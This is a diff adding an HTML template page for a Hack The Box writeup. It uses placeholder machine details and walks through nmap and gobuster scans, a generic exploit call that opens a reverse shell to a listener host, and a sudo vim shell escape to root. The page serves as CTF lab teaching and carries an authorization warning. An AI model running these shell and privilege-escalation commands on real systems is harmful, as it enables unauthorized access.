@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Machine Name | HTB Writeup - Miguel</title>
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="stylesheet" href="../css/writeup.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="../index.html" class="nav-logo">
+                <span class="logo-bracket">[</span>miguel<span class="logo-bracket">]</span>
+            </a>
+            <ul class="nav-menu">
+                <li><a href="../index.html#about" class="nav-link">About</a></li>
+                <li><a href="../index.html#projects" class="nav-link">Projects</a></li>
+                <li><a href="../index.html#writeups" class="nav-link">HTB Writeups</a></li>
+                <li><a href="../index.html#contact" class="nav-link">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Writeup Content -->
+    <article class="writeup-article">
+        <div class="container">
+            <!-- Header -->
+            <header class="writeup-header-full">
+                <a href="../index.html#writeups" class="back-link">&larr; Back to Writeups</a>
+                <div class="machine-info">
+                    <h1 class="machine-name">Machine Name</h1>
+                    <div class="machine-meta">
+                        <span class="difficulty easy">Easy</span>
+                        <span class="os-tag">Linux</span>
+                        <span class="date">January 2025</span>
+                    </div>
+                </div>
+                <div class="machine-stats">
+                    <div class="stat">
+                        <span class="stat-label">IP</span>
+                        <span class="stat-value">10.10.10.XX</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">User Flag</span>
+                        <span class="stat-value flag">&#10003;</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-label">Root Flag</span>
+                        <span class="stat-value flag">&#10003;</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Table of Contents -->
+            <nav class="toc">
+                <h2>Table of Contents</h2>
+                <ul>
+                    <li><a href="#recon">1. Reconnaissance</a></li>
+                    <li><a href="#enumeration">2. Enumeration</a></li>
+                    <li><a href="#exploitation">3. Initial Foothold</a></li>
+                    <li><a href="#user">4. User Flag</a></li>
+                    <li><a href="#privesc">5. Privilege Escalation</a></li>
+                    <li><a href="#root">6. Root Flag</a></li>
+                    <li><a href="#lessons">7. Lessons Learned</a></li>
+                </ul>
+            </nav>
+
+            <!-- Content -->
+            <section id="recon" class="writeup-section">
+                <h2><span class="section-number">01</span> Reconnaissance</h2>
+                <p>
+                    Starting with a basic nmap scan to identify open ports and services.
+                </p>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>$ nmap -sC -sV -oN nmap/initial 10.10.10.XX
+
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.10.10.XX
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.52</code></pre>
+                </div>
+
+                <p>
+                    We can see SSH on port 22 and a web server on port 80. Let's investigate
+                    the web application further.
+                </p>
+            </section>
+
+            <section id="enumeration" class="writeup-section">
+                <h2><span class="section-number">02</span> Enumeration</h2>
+                <p>
+                    Running directory enumeration with gobuster to find hidden paths.
+                </p>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>$ gobuster dir -u http://10.10.10.XX -w /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Gobuster v3.5
+===============================================================
+[+] Url:                     http://10.10.10.XX
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+===============================================================
+/admin                (Status: 301)
+/login                (Status: 200)
+/uploads              (Status: 301)</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <span class="info-icon">&#128161;</span>
+                    <p>
+                        <strong>Tip:</strong> Always check for common misconfigurations
+                        in web applications, such as exposed admin panels or upload
+                        directories without proper authentication.
+                    </p>
+                </div>
+            </section>
+
+            <section id="exploitation" class="writeup-section">
+                <h2><span class="section-number">03</span> Initial Foothold</h2>
+                <p>
+                    After identifying a vulnerability, we can exploit it to gain initial access.
+                </p>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>$ python3 exploit.py --target 10.10.10.XX --lhost 10.10.14.XX
+
+[*] Sending payload...
+[*] Triggering exploit...
+[+] Shell received!
+
+$ whoami
+www-data</code></pre>
+                </div>
+
+                <div class="warning-box">
+                    <span class="warning-icon">&#9888;</span>
+                    <p>
+                        <strong>Warning:</strong> Only perform these techniques on systems
+                        you have explicit permission to test. Unauthorized access is illegal.
+                    </p>
+                </div>
+            </section>
+
+            <section id="user" class="writeup-section">
+                <h2><span class="section-number">04</span> User Flag</h2>
+                <p>
+                    Escalating from www-data to a regular user account.
+                </p>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>$ cat /home/user/user.txt
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre>
+                </div>
+
+                <div class="flag-box">
+                    <span class="flag-icon">&#127937;</span>
+                    <p><strong>User Flag Captured!</strong></p>
+                </div>
+            </section>
+
+            <section id="privesc" class="writeup-section">
+                <h2><span class="section-number">05</span> Privilege Escalation</h2>
+                <p>
+                    Looking for privilege escalation vectors using linpeas or manual enumeration.
+                </p>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code>$ sudo -l
+User user may run the following commands on machine:
+    (ALL) NOPASSWD: /usr/bin/vim
+
+$ sudo /usr/bin/vim -c ':!/bin/bash'
+root@machine:~#</code></pre>
+                </div>
+            </section>
+
+            <section id="root" class="writeup-section">
+                <h2><span class="section-number">06</span> Root Flag</h2>
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Terminal</span>
+                        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                    </div>
+                    <pre><code># cat /root/root.txt
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre>
+                </div>
+
+                <div class="flag-box root">
+                    <span class="flag-icon">&#128081;</span>
+                    <p><strong>Root Flag Captured! Machine Pwned!</strong></p>
+                </div>
+            </section>
+
+            <section id="lessons" class="writeup-section">
+                <h2><span class="section-number">07</span> Lessons Learned</h2>
+                <ul class="lessons-list">
+                    <li>Always perform thorough enumeration before exploitation</li>
+                    <li>Check for misconfigured sudo permissions</li>
+                    <li>Document your methodology for future reference</li>
+                    <li>Use GTFOBins for privilege escalation via sudo</li>
+                </ul>
+
+                <h3>Tools Used</h3>
+                <div class="tools-used">
+                    <span class="tool-tag">nmap</span>
+                    <span class="tool-tag">gobuster</span>
+                    <span class="tool-tag">linpeas</span>
+                    <span class="tool-tag">python</span>
+                </div>
+            </section>
+
+            <!-- Navigation -->
+            <nav class="writeup-nav">
+                <a href="../index.html#writeups" class="nav-btn">&larr; All Writeups</a>
+            </nav>
+        </div>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2025 Miguel. Built with passion for security.</p>
+            <p class="footer-note">All HTB writeups are for retired machines only.</p>
+        </div>
+    </footer>
+
+    <script>
+        function copyCode(button) {
+            const codeBlock = button.closest('.code-block').querySelector('code');
+            navigator.clipboard.writeText(codeBlock.textContent);
+            button.textContent = 'Copied!';
+            setTimeout(() => button.textContent = 'Copy', 2000);
+        }
+    </script>
+</body>
+</html>
